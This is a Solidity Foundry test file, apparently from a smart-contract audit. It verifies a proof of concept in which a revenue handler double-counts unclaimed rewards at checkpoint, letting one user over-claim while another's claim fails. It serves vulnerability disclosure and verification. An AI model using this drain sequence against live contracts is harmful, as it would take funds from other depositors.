// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./38176-revenuehandlercheckpoint-counts-unclaimed-rewards-as-new-rew.sol";

contract RevenueDoubleCountTest is Test {
    /// @notice HARM: run() proves user1 over-claims (125 BAL vs a fair 100
    ///         BAL for 2 epochs) while user2's equal claim reverts due to
    ///         insolvency -- exactly matching the finding's own PoC output.
    function test_exploit_lateClaimerLosesToDoubleCount() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.bal().balanceOf(e.USER1()), 125 ether, "user1 over-claims to 125 BAL");
        assertEq(e.bal().balanceOf(e.USER2()), 0, "user2 never receives anything");
        assertEq(e.bal().balanceOf(address(e.revenueHandler())), 75 ether, "75 BAL of real tokens remain, less than user2's 125 claimable");
    }

    /// @notice Isolates the exact double-count progression across two
    ///         checkpoints with no claims in between: 100 -> 250 total
    ///         recorded, from only 200 BAL ever transferred in.
    function test_buggyHandler_totalRecordedExceedsRealBalance() public {
        MockBAL bal = new MockBAL();
        RevenueHandler rh = new RevenueHandler(bal);

        bal.mint(address(rh), 100 ether);
        rh.checkpoint();
        assertEq(rh.epochRevenues(1), 100 ether);

        bal.mint(address(rh), 100 ether);
        rh.advanceEpoch();
        rh.checkpoint();
        assertEq(rh.epochRevenues(2), 200 ether, "second checkpoint re-counts the full 200 balance, not just the 100 new");

        uint256 totalRecorded = rh.epochRevenues(1) + rh.epochRevenues(2);
        assertEq(totalRecorded, 300 ether);
        assertEq(bal.balanceOf(address(rh)), 200 ether, "only 200 BAL was ever really transferred in");
        assertGt(totalRecorded, bal.balanceOf(address(rh)), "books claim more than the contract actually holds");
    }

    /// @notice Control: if BOTH users claim promptly after every checkpoint
    ///         (no unclaimed balance ever carries over), the accounting is
    ///         correct -- isolating that the bug requires unclaimed carry-over,
    ///         not that checkpoint() is broken outright.
    function test_control_promptClaimingByBothUsersIsCorrect() public {
        MockBAL bal = new MockBAL();
        RevenueHandler rh = new RevenueHandler(bal);
        address user1 = address(0xACC1);
        address user2 = address(0xACC2);

        bal.mint(address(rh), 100 ether);
        rh.checkpoint();
        rh.claim(user1);
        rh.claim(user2);
        assertEq(bal.balanceOf(user1), 50 ether);
        assertEq(bal.balanceOf(user2), 50 ether);
        assertEq(bal.balanceOf(address(rh)), 0, "contract drained to zero -- no unclaimed carry-over to double-count");

        bal.mint(address(rh), 100 ether);
        rh.advanceEpoch();
        rh.checkpoint();
        assertEq(rh.epochRevenues(2), 100 ether, "with no leftover balance, checkpoint correctly records only the new 100");

        rh.claim(user1);
        rh.claim(user2);
        assertEq(bal.balanceOf(user1), 100 ether, "user1's fair total across 2 epochs");
        assertEq(bal.balanceOf(user2), 100 ether, "user2's fair total across 2 epochs");
    }
}
